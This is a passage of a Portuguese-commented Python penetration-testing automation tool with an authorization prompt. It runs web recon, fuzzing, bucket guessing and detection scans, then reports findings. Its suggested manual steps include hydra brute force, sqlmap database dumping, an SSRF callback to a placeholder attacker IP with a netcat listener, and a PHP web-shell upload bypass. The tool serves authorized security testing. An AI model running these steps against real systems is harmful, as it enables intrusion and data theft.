    print(f"{C.AMBER}{C.BOLD}▲ AUTORIZACAO OBRIGATORIA{C.RESET}")
    print(f"{C.GRAY}So execute contra um alvo com autorizacao por escrito (ROE/SOW assinado{C.RESET}")
    print(f"{C.GRAY}ou programa de bug bounty com esse asset em escopo). Testar sem isso e{C.RESET}")
    print(f"{C.GRAY}crime (Lei 12.737/2012 BR / CFAA EUA / CMA UK).{C.RESET}")
    print()
    if skip:
        return
    if not sys.stdin.isatty():
        print(f"{C.RED}Sem terminal interativo pra confirmar a autorizacao. Abortando "
              f"(isso e proposital: nunca pula essa confirmacao sem um humano de verdade digitando).{C.RESET}")
        sys.exit(1)
    resp = input(f'{C.CYAN}❯{C.RESET} Digite {C.GREEN}{C.BOLD}AUTORIZADO {target}{C.RESET} pra confirmar e continuar: ')
    if resp.strip() != f"AUTORIZADO {target}":
        print(f"{C.RED}Confirmacao nao bateu. Abortando.{C.RESET}")
        sys.exit(1)
    print()


class Findings:
    def __init__(self):
        self.items = []

    def add(self, fase, tipo, detalhe):
        self.items.append({"fase": fase, "tipo": tipo, "detalhe": str(detalhe)[:200]})

    def __len__(self):
        return len(self.items)


_STEP_TAG_RE = re.compile(r"^([\w./]+):\s*(.*)$", re.S)
_STEP_CMD_RE = re.compile(r"`([^`]+)`")


def _format_manual_steps(steps):
    """Agrupa os passos manuais por modulo (M1.4, M1.5...), com o comando
    (se tiver) destacado em bloco de codigo embaixo da descricao -- antes
    vinha tudo numa linha so, descricao e comando misturados, dificil de
    escanear rapido numa lista longa."""
    lines = []
    last_tag = object()  # sentinela, nunca bate com tag nenhuma na 1a iteracao
    for step in steps:
        m = _STEP_TAG_RE.match(step)
        tag, rest = (m.group(1), m.group(2)) if m else (None, step)
        if tag != last_tag:
            if lines:
                lines.append("")
            if tag:
                lines.append(f"**{tag}**")
            last_tag = tag
        commands = _STEP_CMD_RE.findall(rest)
        desc = _STEP_CMD_RE.sub("", rest)
        desc = re.sub(r"\s*--\s*(?=\(|$)", " ", desc)  # "--" orfao onde o comando foi removido
        desc = re.sub(r"\s{2,}", " ", desc).strip(" -")
        lines.append(f"- {desc}")
        if commands:
            lines.append("  ```")
            for cmd in commands:
                lines.append(f"  {cmd}")
            lines.append("  ```")
    return lines


def write_report(workdir: Path, module_name, target, active, findings: Findings,
                  manual_next_steps, log: Log):
    report_path = workdir / "RESULTADOS.md"
    lines = [
        f"# Resultado automatizado, {module_name}",
        "",
        f"- Alvo: `{target}`",
        f"- Executado em: {ts()}",
        f"- Modo: {'ativo (deteccao)' if active else 'passivo'}",
        "",
        f"## Achados sinalizados ({len(findings)})",
        "",
    ]
    if findings.items:
        lines.append("| Fase | Tipo | Detalhe |")
        lines.append("|---|---|---|")
        for f in findings.items:
            detalhe = f["detalhe"].replace("|", "\\|")
            lines.append(f"| {f['fase']} | {f['tipo']} | {detalhe} |")
    else:
        lines.append("Nenhum achado automatico sinalizado. Isso NAO significa que o alvo")
        lines.append("esta seguro, so que os checks automatizados nao encontraram nada.")
        lines.append("Continue a analise manual a partir do guia.")
    lines += ["", "## Arquivos gerados", "", f"Ver pasta `{workdir}/`.", "",
              "## Proximos passos manuais (nao automatizados por design)", ""]
    lines += _format_manual_steps(manual_next_steps)
    lines.append("")
    report_path.write_text("\n".join(lines), encoding="utf-8")
    log.ok(f"relatorio salvo em {report_path}")
    print()
    print(f"{C.GRAY}{'─' * 60}{C.RESET}")
    count_color = C.AMBER if len(findings) else C.GREEN
    print(f"{count_color}{C.BOLD}{len(findings)} achado(s) sinalizado(s).{C.RESET} "
          f"{C.GRAY}Relatorio completo:{C.RESET} {C.CYAN}{report_path}{C.RESET}")


def make_workdir(subpath, label):
    safe_label = re.sub(r"[^\w.-]", "_", label)
    workdir = Path.home() / "pentest" / subpath / safe_label
    for sub in ("recon", "enum", "exploit", "evidence"):
        (workdir / sub).mkdir(parents=True, exist_ok=True)
    return workdir


def report_nuclei_findings(nuclei_file: Path, fase, findings: "Findings", log: Log):
    """Le o arquivo de saida do nuclei e soma os achados no relatorio final
    (antes disso o resultado ficava preso no arquivo e nunca era contado)."""
    if not nuclei_file.exists():
        return
    lines = [l for l in nuclei_file.read_text(encoding="utf-8", errors="ignore").splitlines() if l.strip()]
    if not lines:
        log.ok("  nuclei nao encontrou nada")
        return
    log.warn(f"  nuclei encontrou {len(lines)} achado(s), ver {nuclei_file.name}")
    for line in lines[:10]:  # nao inunda o relatorio, so os 10 primeiros, arquivo completo fica salvo
        findings.add(fase, "nuclei", line)
    if len(lines) > 10:
        findings.add(fase, "nuclei", f"+{len(lines) - 10} achado(s) a mais, ver {nuclei_file}")


def report_dalfox_findings(dalfox_file: Path, fase, findings: "Findings", log: Log):
    """Mesma ideia do report_nuclei_findings, mas pro dalfox -- antes o
    resultado dele ficava preso no arquivo bruto e nunca contava no
    relatorio final, mesmo quando achava XSS real. --silent so imprime
    linha quando confirma algo, entao qualquer linha nao-vazia aqui e
    achado de verdade, nao ruido."""
    if not dalfox_file.exists():
        return
    lines = [l for l in dalfox_file.read_text(encoding="utf-8", errors="ignore").splitlines() if l.strip()]
    if not lines:
        log.ok("  dalfox nao encontrou XSS")
        return
    log.warn(f"  dalfox encontrou {len(lines)} achado(s) de XSS, ver {dalfox_file.name}")
    for line in lines[:10]:
        findings.add(fase, "dalfox XSS", line)
    if len(lines) > 10:
        findings.add(fase, "dalfox XSS", f"+{len(lines) - 10} achado(s) a mais, ver {dalfox_file}")


_SSLSCAN_WEAK_PROTO = re.compile(r"^Accepted\s+(SSLv2|SSLv3|TLSv1\.0|TLSv1\.1)\b", re.I | re.M)
_SSLSCAN_WEAK_CIPHER = re.compile(r"^Accepted.*\b(NULL|EXPORT|RC4|DES|MD5|anon)\b", re.I | re.M)


def report_sslscan_findings(sslscan_out, fase, findings: "Findings", log: Log):
    """sslscan ja imprime 'Accepted <protocolo/cipher>' pra cada combinacao
    que o servidor aceita -- filtra so as entradas fracas/obsoletas
    (SSLv2/3, TLS 1.0/1.1, RC4/DES/MD5/export/null/anon), que sao
    vulnerabilidade de verdade, nao estavam sendo verificadas antes."""
    weak = set(m.group(0).strip() for m in _SSLSCAN_WEAK_PROTO.finditer(sslscan_out))
    weak |= set(m.group(0).strip() for m in _SSLSCAN_WEAK_CIPHER.finditer(sslscan_out))
    if not weak:
        log.ok("  sslscan: nenhum protocolo/cipher fraco aceito")
        return
    for line in sorted(weak)[:10]:
        findings.add(fase, "protocolo/cipher TLS fraco aceito", line)
    log.warn(f"  sslscan: {len(weak)} protocolo(s)/cipher(s) fraco(s) aceito(s)")


def report_sqlmap_findings(sqlmap_file: Path, target_url, fase, findings: "Findings", log: Log):
    """O sqlmap sempre imprime uma ou mais linhas 'Parameter: ' quando
    confirma um parametro injetavel -- usa isso como sinal de achado real
    (diferente de so rodar e nunca reportar o resultado de volta, que era
    o comportamento antes desta correcao)."""
    if not sqlmap_file.exists():
        return
    text = sqlmap_file.read_text(encoding="utf-8", errors="ignore")
    param_lines = [l.strip() for l in text.splitlines() if l.strip().startswith("Parameter:")]
    if not param_lines:
        log.ok("  sqlmap nao confirmou injecao nessa URL")
        return
    log.warn(f"  sqlmap CONFIRMOU SQL injection em {target_url}, ver {sqlmap_file.name}")
    for line in param_lines[:10]:
        findings.add(fase, "sqlmap SQLi confirmada", f"{target_url} :: {line}")


def parse_targets_file(path):
    """Le um arquivo com um alvo por linha (URL ou dominio), ignora linhas
    vazias e comentarios (#)."""
    p = Path(path)
    if not p.exists():
        return []
    targets = []
    for line in p.read_text(encoding="utf-8", errors="ignore").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        targets.append(line)
    return targets


def domain_of(target):
    target = target.strip()
    if "://" in target:
        from urllib.parse import urlparse
        return urlparse(target).hostname or target
    return target.split("/")[0]


def run_batch(module, targets, args, log, findings_summary, batch_workdir):
    """Roda o modulo escolhido pra cada alvo da lista, um de cada vez. Um
    alvo com erro nao derruba o lote inteiro (log do erro e segue pro
    proximo). Cada alvo ganha sua propria subpasta e RESULTADOS.md, e tudo
    tambem fica resumido no relatorio agregado do lote."""
    for i, target in enumerate(targets, 1):
        domain = domain_of(target)
        url = target if "://" in target else f"https://{target}"
        log.step(f"[{i}/{len(targets)}] {target}")

        target_dir = batch_workdir / re.sub(r"[^\w.-]", "_", domain)
        for sub in ("recon", "enum", "exploit", "evidence"):
            (target_dir / sub).mkdir(parents=True, exist_ok=True)
        target_log = Log(target_dir / "session.log")
        target_findings = Findings()

        try:
            if module == "web":
                manual_steps = module_web(domain, url, args.active, target_log, target_findings, target_dir,
                                           wordlist_override=args.wordlist, threads=args.threads,
                                           wordlist_size=args.wordlist_size, recursion_depth=args.recursion_depth)
            elif module == "api":
                manual_steps = module_api(domain, url, args.active, target_log, target_findings, target_dir,
                                           threads=args.threads)
            elif module == "bugbounty":
                manual_steps = module_bugbounty(domain, args.program, args.active, target_log, target_findings, target_dir)
            else:
                manual_steps = []
        except Exception as e:
            target_log.warn(f"erro inesperado nesse alvo, pulando pro proximo: {e}")
            manual_steps = [f"alvo falhou com erro, revisar manualmente: {e}"]

        write_report(target_dir, MODULES[module], target, args.active, target_findings, manual_steps, target_log)
        for item in target_findings.items:
            findings_summary.add(item["fase"], f"[{domain}] {item['tipo']}", item["detalhe"])


def vhost_fuzz(domain, url, workdir, log, findings):
    """Fuzzing de Virtual Host: tenta varios subdominios no header Host contra
    o mesmo IP/URL, pra achar vhosts que nao aparecem no DNS publico. Usa um
    Host claramente falso como baseline pra filtrar a resposta padrao (senao
    toda tentativa 'bate' com o catch-all e gera falso positivo)."""
    log.step("M1.3 Virtual Hosts")
    wordlist = find_wordlist(SECLISTS_SUBS_5000, log)
    if not wordlist or not require_tool("ffuf", log):
        log.skip("pulando fuzzing de vhost (sem wordlist de subdominios ou sem ffuf)")
        return

    import random
    probe_host = f"naoexiste{random.randint(100000, 999999)}.{domain}"
    rc, out = run(f'curl -s -o /dev/null -w "%{{size_download}}" -H "Host: {probe_host}" {url}',
                  log, timeout=10)
    try:
        baseline_size = int(out.strip())
    except ValueError:
        baseline_size = None
        log.warn("  nao consegui medir o tamanho de resposta padrao, vhost fuzz pode gerar mais ruido")

    enum_dir = workdir / "enum"
    vhost_out = enum_dir / "vhosts.json"
    cmd = f'ffuf -u {url} -H "Host: FUZZ.{domain}" -w {wordlist} -ac -mc all -noninteractive -o {vhost_out} -of json'
    if baseline_size is not None:
        cmd += f" -fs {baseline_size}"
    run(cmd, log, label="ffuf (fuzzing de vhost)", timeout=600)

    if not vhost_out.exists():
        log.ok("  nenhum vhost distinto encontrado (ou ffuf nao gerou saida)")
        return
    try:
        data = json.loads(vhost_out.read_text(encoding="utf-8", errors="ignore"))
        results = data.get("results", [])
    except Exception:
        log.info(f"  ffuf rodou, ver {vhost_out.name} pro resultado bruto (nao consegui parsear)")
        return
    if results:
        for r in results[:15]:
            host_found = r.get("input", {}).get("FUZZ", "?") + "." + domain
            findings.add("M1.3", "vhost encontrado", host_found)
        log.warn(f"  {len(results)} vhost(s) distinto(s) encontrado(s), ver enum/{vhost_out.name}")
    else:
        log.ok("  nenhum vhost distinto do padrao encontrado")


BUCKET_SUFFIXES = ["", "-assets", "-backup", "-backups", "-files", "-static",
                   "-dev", "-prod", "-staging", "-media", "-uploads", "-data",
                   "-www", "-public", "-private", "-images", "-cdn", "-storage"]


def guess_bucket_names(domain):
    base = domain.split(".")[0]
    variants = {base, domain.replace(".", "-"), domain.replace(".", "")}
    names = set()
    for v in variants:
        for suf in BUCKET_SUFFIXES:
            names.add(f"{v}{suf}")
    return sorted(names)


def check_cloud_buckets(domain, workdir, log, findings, threads=20):
    """Tenta nomes de bucket S3/GCS derivados do dominio (tecnica de
    'bucket guessing', igual ferramentas tipo s3scanner fazem). So GET
    anonimo, nao exige credencial nenhuma. 200 = publico (achado real),
    403 = existe mas e privado (so informativo). Roda em paralelo, senao
    os ~100 nomes testados (S3+GCS) levam minutos rodando um por um."""
    log.step("M1.3 Buckets S3/GCS (nome derivado do dominio)")
    names = guess_bucket_names(domain)
    enum_dir = workdir / "enum"

    for provider, url_tmpl, fname in (
        ("S3", "https://{}.s3.amazonaws.com/", "buckets_s3.txt"),
        ("GCS", "https://storage.googleapis.com/{}/", "buckets_gcs.txt"),
    ):
        log.info(f"testando {len(names)} nome(s) de bucket {provider} candidato(s), {threads} em paralelo...")
        urls = [url_tmpl.format(name) for name in names]
        spinner = Spinner(f"buckets {provider}", log).start()
        try:
            results = threaded_status_checks(urls, timeout=5, max_workers=threads, spinner=spinner)
        finally:
            spinner.stop()
        candidates_200, private = [], []
        for (full_url, code), name in zip(results, names):
            if code == 200:
                candidates_200.append((full_url, name))
            elif code == 403:
                private.append(name)

        # segunda camada: confirma que o 200 e mesmo uma listagem de bucket
        # de verdade (assinatura XML/JSON do provedor), nao uma pagina
        # qualquer que por acaso responde 200 nesse mesmo hostname
        exposed, discarded = [], []
        for full_url, name in candidates_200:
            _, body = fetch_body_snippet(full_url)
            if looks_like_real_bucket(provider, body):
                exposed.append(name)
            else:
                discarded.append(f"{name} (200 mas corpo nao parece listagem de bucket de verdade)")
        if discarded:
            log.info(f"  {len(discarded)} candidato(s) {provider} descartado(s) na validacao de conteudo")

        (enum_dir / fname).write_text(
            f"PUBLICO (200, achado real, validado por conteudo):\n" + ("\n".join(exposed) or "(nenhum)") +
            f"\n\nEXISTE MAS PRIVADO (403, nao conta como achado):\n" + ("\n".join(private) or "(nenhum)") +
            f"\n\nDESCARTADO (200 mas falhou na validacao, provavel falso positivo):\n" + ("\n".join(discarded) or "(nenhum)"),
            encoding="utf-8",
        )
        if exposed:
            for b in exposed:
                findings.add("M1.3", f"bucket {provider} publico", b)
            log.warn(f"  {len(exposed)} bucket(s) {provider} PUBLICO(S) e VALIDADO(S), ver enum/{fname}")
        if private:
            log.info(f"  {len(private)} bucket(s) {provider} existem mas sao privados")
        if not exposed and not private:
            log.ok(f"  nenhum bucket {provider} candidato encontrado")


def collect_param_urls(workdir: Path):
    urls = set()
    for fname in ("gau.txt", "waybackurls.txt", "katana.txt"):
        f = workdir / "recon" / fname
        if f.exists():
            for line in f.read_text(encoding="utf-8", errors="ignore").splitlines():
                if "?" in line and "=" in line:
                    urls.add(line.strip())
    return sorted(urls)


def find_real_url(workdir: Path, keywords):
    """Procura nos arquivos de recon ja coletados (katana/gau/waybackurls) uma
    URL de verdade que contenha algum dos keywords (ex.: 'login', 'upload').
    Usado pra montar comando de proximo-passo com endpoint REAL encontrado
    pelo proprio scan, em vez de chutar um caminho generico tipo /login --
    so chuta (retorna None) quando o recon realmente nao achou nada parecido."""
    for fname in ("katana.txt", "gau.txt", "waybackurls.txt"):
        f = workdir / "recon" / fname
        if not f.exists():
            continue
        for line in f.read_text(encoding="utf-8", errors="ignore").splitlines():
            line = line.strip()
            if line and any(kw in line.lower() for kw in keywords):
                return line
    return None


# =============================================================================
# MODULO 1 -- PENTEST WEB
# =============================================================================

def module_web(domain, url, active, log, findings, workdir, wordlist_override=None, threads=20,
               wordlist_size="small", recursion_depth=1):
    url = url or f"https://{domain}"
    recon_dir, enum_dir, exploit_dir, auth_dir = (
        workdir / "recon", workdir / "enum", workdir / "exploit", workdir / "auth")
    auth_dir.mkdir(exist_ok=True)

    log.step("M1.2 Reconhecimento (em paralelo)")
    # as 6 ferramentas abaixo sao independentes entre si -- nenhuma consome
    # a saida de outra -- e rodavam em sequencia, somando o tempo de todas
    # (gau sozinho ja leva 70-90s, arjun ate 180s). Rodar em paralelo corta
    # o tempo total pra aproximadamente o da mais lenta, nao a soma de todas.
    # retries=1 em cada uma: um timeout aqui costuma ser transitorio (rede,
    # DNS, servidor devagar na hora), nao motivo pra ficar sem a informacao
    # pro resto da execucao -- da uma segunda chance antes de desistir
    def _count_lines(path):
        try:
            return sum(1 for ln in path.open(encoding="utf-8", errors="ignore") if ln.strip())
        except Exception:
            return 0

    recon_tasks = []
    if require_tool("subfinder", log) and require_tool("httpx", log):
        def _subfinder_task():
            rc, _ = run(
                f"subfinder -d {domain} -all -silent | httpx -title -tech-detect -status-code -o {recon_dir/'live.txt'}",
                log, timeout=300, retries=1)
            n = _count_lines(recon_dir / "live.txt")
            if n:
                log.ok(f"  subfinder+httpx: {n} host(s) vivo(s) -> recon/live.txt")
            else:
                log.info("  subfinder+httpx: nenhum host vivo encontrado")
        recon_tasks.append(("subfinder+httpx", _subfinder_task))
    if require_tool("katana", log):
        def _katana_task():
            rc, _ = run(f"katana -u {url} -d 3 -jc -o {recon_dir/'katana.txt'}", log, timeout=300, retries=1)
            n = _count_lines(recon_dir / "katana.txt")
            if n:
                log.ok(f"  katana: {n} URL(s) crawleada(s) -> recon/katana.txt")
            else:
                log.info("  katana: nenhuma URL crawleada")
        recon_tasks.append(("katana", _katana_task))
    if require_tool("gau", log):
        def _gau_task():
            rc, _ = run(f"gau {domain} --o {recon_dir/'gau.txt'}", log, timeout=240, retries=1)
            n = _count_lines(recon_dir / "gau.txt")
            if n:
                log.ok(f"  gau: {n} URL(s) historica(s) -> recon/gau.txt")
            else:
                log.info("  gau: nenhuma URL historica")
        recon_tasks.append(("gau", _gau_task))
    if require_tool("waybackurls", log):
        def _waybackurls_task():
            rc, out = run(f"waybackurls {domain}", log, timeout=180, retries=1)
            if out:
                (recon_dir / "waybackurls.txt").write_text(out, encoding="utf-8")
            n = _count_lines(recon_dir / "waybackurls.txt")
            if n:
                log.ok(f"  waybackurls: {n} URL(s) do Wayback -> recon/waybackurls.txt")
            else:
                log.info("  waybackurls: nenhuma URL do Wayback")
        recon_tasks.append(("waybackurls", _waybackurls_task))
    if require_tool("arjun", log):
        def _arjun_task():
            rc, _ = run(f"arjun -u {url} -m GET --stable -oT {recon_dir/'arjun_params.txt'}",
                        log, timeout=180, retries=1)
            n = _count_lines(recon_dir / "arjun_params.txt")
            if n:
                log.ok(f"  arjun: {n} parametro(s) oculto(s) descoberto(s) -> recon/arjun_params.txt")
            else:
                log.info("  arjun: nenhum parametro oculto descoberto")
        recon_tasks.append(("arjun", _arjun_task))
    if require_tool("wafw00f", log):
        def _wafw00f_task():
            rc, out = run(f"wafw00f -a {url}", log, outfile=recon_dir / "wafw00f.txt",
                          timeout=60, retries=1)
            # wafw00f colore a saida; tira os codigos ANSI pra o nome do WAF
            # sair limpo no log (senao aparece "[1;96mCloudflare[0m")
            out = re.sub(r"\x1b\[[0-9;]*m", "", out)
            waf = None
            for ln in out.splitlines():
                m = re.search(r"is behind\s+(.+?)\s+WAF", ln)
                if m:
                    waf = m.group(1).strip()
                    break
            if waf:
                log.warn(f"  wafw00f: WAF detectado -> {waf} (ajuste payloads/throttle pra esse WAF)")
            elif re.search(r"No WAF detected", out, re.I):
                log.ok("  wafw00f: nenhum WAF detectado (generico)")
            else:
                log.info("  wafw00f: resultado inconclusivo, ver recon/wafw00f.txt")
        recon_tasks.append(("wafw00f", _wafw00f_task))

    if recon_tasks:
        total_tasks = len(recon_tasks)
        spinner = Spinner(f"Reconhecimento ({total_tasks} ferramentas em paralelo)", log).start()
        spinner.set_percent(0.0)  # % real: quantas das N ferramentas ja terminaram, nao estimativa
        done_count = 0
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=total_tasks) as ex:
                futures = {ex.submit(fn): name for name, fn in recon_tasks}
                for fut in concurrent.futures.as_completed(futures):
                    name = futures[fut]
                    try:
                        fut.result()
                    except Exception as e:
                        log.warn(f"  {name} falhou com erro inesperado: {e}")
                    done_count += 1
                    spinner.set_percent(done_count / total_tasks * 100)
        finally:
            spinner.stop()

    log.step("M1.3 Enumeracao")
    default_wordlist = SECLISTS_DIRS_BY_SIZE.get(wordlist_size, SECLISTS_DIRS_MEDIUM)
    if wordlist_override:
        if Path(wordlist_override).exists():
            wordlist = wordlist_override
            log.ok(f"usando wordlist manual: {wordlist}")
        else:
            log.warn(f"wordlist informado manualmente nao existe ({wordlist_override}), "
                     f"caindo pra deteccao automatica")
            wordlist = find_wordlist(default_wordlist, log)
    else:
        wordlist = find_wordlist(default_wordlist, log)
    if wordlist and require_tool("ffuf", log):
        # -recursion-depth multiplica o numero de requisicoes de forma nao
        # linear: cada pasta descoberta vira uma nova varredura completa da
        # wordlist. Testamos na pratica -- mesmo com depth=1 (ja reduzido) e
        # wordlist "medium" (~30k linhas), a conta nao fecha: 30k x 9
        # variantes de extensao = ~270k requisicoes, nao terminou nem em
        # 650s contra um alvo publico real. O gargalo nao era so a
        # recursao, era a base (wordlist x extensoes) ja ser grande demais
        # pro timeout. Reduzido pras extensoes de maior sinal de exposicao
        # real (menos "achar qualquer .php", mais "achar backup/segredo"),
        # o que corta o multiplicador de 9x pra 6x.
        recursion_flags = f"-recursion -recursion-depth {recursion_depth}" if recursion_depth > 0 else ""
        run(f"ffuf -u {url}/FUZZ -w {wordlist} -e .env,.bak,.sql,.zip,.log "
            f"{recursion_flags} -mc 200,301,302 -ac -t 60 -noninteractive "
            f"-o {enum_dir/'ffuf_dirs.json'} -of json",
            log, label=f"ffuf (fuzzing de diretorios, {wordlist_size}, depth={recursion_depth})", timeout=600)
    hits = check_paths(url, SENSITIVE_PATHS, enum_dir / "sensitive_files.txt", log, "arquivos sensiveis", threads=threads)
    for h in hits: findings.add("M1.3", "arquivo sensivel exposto", h)
    hits = check_paths(url, ADMIN_API_PATHS, enum_dir / "admin_api.txt", log, "endpoints admin/API", threads=threads)
    for h in hits: findings.add("M1.3", "endpoint admin/API exposto", h)
    if require_tool("sslscan", log):
        rc, out = run(f"sslscan {domain}:443", log, outfile=enum_dir / "sslscan.txt", timeout=60, retries=1)
        report_sslscan_findings(out, "M1.3", findings, log)
    _grep_js_secrets(workdir, url, log, findings)
    vhost_fuzz(domain, url, workdir, log, findings)
    check_cloud_buckets(domain, workdir, log, findings, threads=threads)

    log.step("M1.4 Autenticacao (checagem passiva)")
    code, headers = http_get_status(url)
    cookie = headers.get("Set-Cookie", "")
    if cookie and "samesite" not in cookie.lower():
        findings.add("M1.4", "cookie sem SameSite", cookie[:100])
        log.warn("  cookie de sessao sem SameSite (candidato a CSRF, ver Modulo 11.20)")
    if cookie and "httponly" not in cookie.lower():
        findings.add("M1.4", "cookie sem HttpOnly", cookie[:100])
        log.warn("  cookie de sessao sem HttpOnly (agrava impacto de XSS)")

    log.step("M1.5 Exploracao (deteccao)")
    if not active:
        log.skip("rode com --active pra habilitar nuclei/dalfox/sqlmap em modo deteccao")
    else:
        if require_tool("nuclei", log):
            run(f"nuclei -u {url} -severity critical,high,medium -rl 50 -o {exploit_dir/'nuclei.txt'}",
                log, label="nuclei (deteccao de vulnerabilidades)", timeout=900)
            report_nuclei_findings(exploit_dir / "nuclei.txt", "M1.5", findings, log)
        urls_param = collect_param_urls(workdir)
        if urls_param:
            if require_tool("dalfox", log):
                sample = urls_param[:20]
                (exploit_dir / "dalfox_input.txt").write_text("\n".join(sample), encoding="utf-8")
                run(f"dalfox file {exploit_dir/'dalfox_input.txt'} --silent",
                    log, outfile=exploit_dir / "dalfox.txt", label="dalfox (XSS)", timeout=600)
                report_dalfox_findings(exploit_dir / "dalfox.txt", "M1.5", findings, log)
            if require_tool("sqlmap", log):
                # testava SO a primeira URL -- se ela por acaso nao fosse
                # injetavel mas outra fosse, o sqlmap nunca chegava a testar
                # a de verdade. Agora testa ate 5 candidatas.
                sqlmap_targets = urls_param[:5]
                any_confirmed = False
                for i, target_url in enumerate(sqlmap_targets):
                    log.info(f"sqlmap em MODO DETECCAO ({i+1}/{len(sqlmap_targets)}, sem --dump/--os-shell) contra: {target_url}")
                    summary_file = exploit_dir / f"sqlmap_summary_{i}.txt"
                    run(f'sqlmap -u "{target_url}" --batch --level=2 --risk=1 --technique=BT '
                        f'--output-dir={exploit_dir/"sqlmap"}', log,
                        outfile=summary_file, label=f"sqlmap ({i+1}/{len(sqlmap_targets)})", timeout=300)
                    before = len(findings)
                    report_sqlmap_findings(summary_file, target_url, "M1.5", findings, log)
                    if len(findings) > before:
                        any_confirmed = True
                if not any_confirmed:
                    log.ok(f"  sqlmap testou {len(sqlmap_targets)} URL(s), nenhuma injecao confirmada")
        else:
            log.info("nenhuma URL com parametro encontrada pra testar SQLi/XSS automatizado")

    # busca URL de verdade nos arquivos de recon ja coletados (katana/gau/wayback)
    # em vez de chutar /login, /upload etc -- so usa o generico quando o recon
    # realmente nao achou nada parecido, e isso fica dito explicitamente no passo
    real_param_urls = collect_param_urls(workdir)
    exemplo_param_url = real_param_urls[0] if real_param_urls else None
    login_url = find_real_url(workdir, ("login", "signin", "sign-in", "auth"))
    upload_url = find_real_url(workdir, ("upload",))

    if login_url:
        passo_login = (
            f"M1.4: forca bruta de login -- o recon achou essa URL real: {login_url} . "
            f"Inspecione o form (`curl -s {login_url} | grep -iE 'name=|input'`) pra pegar os "
            f"nomes de campo e a mensagem de erro exatos, depois "
            f"`hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {domain} https-post-form "
            f"\"/login:user=^USER^&pass=^PASS^:F=<mensagem_de_erro_real>\" -t 4 -I` "
            f"(ajuste o path e os campos pro form real -- rode com -t baixo, combine volume com quem autorizou)"
        )
    else:
        passo_login = (
            f"M1.4: forca bruta de login -- o recon NAO achou nenhuma URL de login nas listas "
            f"coletadas (katana/gau/wayback). Navegue o site manualmente pra achar o form real "
            f"antes de montar o comando do hydra -- chutar o path sem confirmar da falso negativo"
        )

    if exemplo_param_url:
        passo_sqlmap = (
            f"M1.5: extracao via sqlmap -- URL real com parametro achada pelo recon: "
            f"{exemplo_param_url} . So depois de confirmar a injecao (nunca direto no --dump) -- "
            f"`sqlmap -u \"{exemplo_param_url}\" --batch --dbs` "
            f"`sqlmap -u \"{exemplo_param_url}\" --batch --dump -D <banco_encontrado>`"
        )
        passo_ssrf = (
            f"M1.5: SSRF -- teste o MESMO parametro real acima com uma URL sua: "
            f"`curl \"{exemplo_param_url.split('?')[0]}?{exemplo_param_url.split('?',1)[-1].split('=')[0]}"
            f"=http://SEU_IP:PORTA/\"` `nc -lvnp PORTA` (so funciona se o parametro aceitar URL "
            f"de verdade, nem todo parametro com = serve pra SSRF -- confirme olhando o que o "
            f"parametro faz antes)"
        )
    else:
        passo_sqlmap = (
            "M1.5: extracao via sqlmap -- o recon NAO achou nenhuma URL com parametro (?x=y) nas "
            "listas coletadas. Sem isso nao tem onde testar SQLi/SSRF automatizado -- navegue o "
            "site manualmente procurando formularios/filtros/busca que gerem URL com parametro"
        )
        passo_ssrf = None

    manual_steps = [passo_login, passo_sqlmap]
    if passo_ssrf:
        manual_steps.append(passo_ssrf)
    manual_steps.append(
        "M1.5: IDOR -- repetir requisicoes autenticadas trocando o ID do objeto (Burp Repeater), "
        "comparar resposta de usuario A vs B no mesmo endpoint"
    )
    if upload_url:
        manual_steps.append(
            f"M1.5: upload bypass -- o recon achou um endpoint de upload real: {upload_url} . "
            f"`curl -F \"file=@shell.php.jpg;type=image/jpeg\" {upload_url}` "
            f"(testar tambem magic bytes de GIF/PNG na frente do payload, e renomear pra "
            f".phtml/.php5/.pht se .php for bloqueado)"
        )
    else:
        manual_steps.append(
            "M1.5: upload bypass -- o recon NAO achou nenhum endpoint de upload nas listas "
            "coletadas. So vale testar isso se voce confirmar visualmente que o site tem "
            "campo de upload de arquivo"
        )
    manual_steps.append(
        "M1.5: deserializacao/request smuggling/cache poisoning/prototype pollution -- exigem Burp "
        "Suite manual (ver Modulo 11 do guia pra payload especifico de cada classe)"
    )
    return manual_steps


def _grep_js_secrets(workdir, url, log, findings):
    katana_file = workdir / "recon" / "katana.txt"
    if not katana_file.exists():
        return
    js_urls = [l for l in katana_file.read_text(encoding="utf-8", errors="ignore").splitlines()
               if l.strip().endswith(".js")]
    if not js_urls:
        return
    log.info(f"verificando segredos em {len(js_urls)} arquivo(s) JS...")
    pattern = re.compile(r"(api[_-]?key|secret|token|password|aws_[a-z_]+)[\"'=: ]+[a-z0-9_\-./+]{8,}", re.I)
    hits = []
    for js in js_urls[:50]:
        try:
            with urllib.request.urlopen(js, timeout=6) as resp:
                body = resp.read(500_000).decode("utf-8", errors="ignore")
            for m in pattern.finditer(body):
                hits.append(f"{js} :: {m.group(0)[:80]}")
        except Exception:
            continue
    if hits:
        (workdir / "enum" / "js_secrets.txt").write_text("\n".join(hits), encoding="utf-8")
        findings.add("M1.3", "possivel segredo em JS", f"{len(hits)} ocorrencia(s), ver enum/js_secrets.txt")
        log.warn(f"  {len(hits)} possivel(is) segredo(s) em JS")
    else:
        log.ok("  nenhum segredo obvio nos JS analisados")


# =============================================================================
# MODULO 2 -- BUG BOUNTY (hunting continuo, diff-based)
# =============================================================================

def module_bugbounty(domain, program, active, log, findings, workdir):
    recon_dir, diffs_dir, exploit_dir = workdir / "recon", workdir / "diffs", workdir / "exploit"
    diffs_dir.mkdir(exist_ok=True)

    log.step("M2.3 Reconhecimento continuo (diff-based)")
    new_file = recon_dir / "subs_new.txt"
    old_file = recon_dir / "subs_old.txt"
    if require_tool("subfinder", log):
        run(f"subfinder -d {domain} -all -silent -o {new_file}", log, timeout=300)
    new_count = len(new_file.read_text(encoding="utf-8", errors="ignore").splitlines()) if new_file.exists() else 0
    if new_count:
        log.ok(f"  subfinder encontrou {new_count} subdominio(s)")
    else:
        log.warn(f"  subfinder nao encontrou nenhum subdominio pra {domain}. Se {domain} ja e um "
                 f"subdominio especifico (ex.: app.empresa.com), use o dominio raiz aqui "
                 f"(ex.: empresa.com) pra esse modulo render alguma coisa.")

    if old_file.exists() and new_file.exists():
        old_set = set(old_file.read_text(encoding="utf-8", errors="ignore").splitlines())
        new_set = set(new_file.read_text(encoding="utf-8", errors="ignore").splitlines())
        diff = sorted(new_set - old_set)
        (diffs_dir / "new_subdomains.txt").write_text("\n".join(diff), encoding="utf-8")
